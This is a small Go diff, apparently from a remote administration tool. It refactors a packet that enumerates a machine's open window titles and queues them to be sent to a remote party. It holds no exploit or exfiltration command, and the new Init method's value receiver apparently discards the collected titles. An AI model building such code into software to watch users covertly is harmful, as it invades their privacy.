@@ -6,25 +6,22 @@ import (
 )
 
 type WindowsPacket struct {
+	Titles []string `send`
 }
 
-func (packet WindowsPacket) GetHeader() common.PacketHeader {
+func (packet WindowsPacket) Header() common.PacketHeader {
 	return common.WindowsHeader
 }
 
-func (packet WindowsPacket) Write(c *Connection) error {
+func (packet WindowsPacket) Init() {
 	windows.QueryWindows()
 
-	c.WriteInt(len(windows.Windows))
-
 	for _, win := range windows.Windows {
-		c.WriteString(win.Title)
+		packet.Titles = append(packet.Titles, win.Title)
 	}
-
-	return nil
 }
 
-func (packet WindowsPacket) Read(c *Connection) error {
+func (packet WindowsPacket) OnReceive() error {
 	Queue <- WindowsPacket{}
 
 	return nil
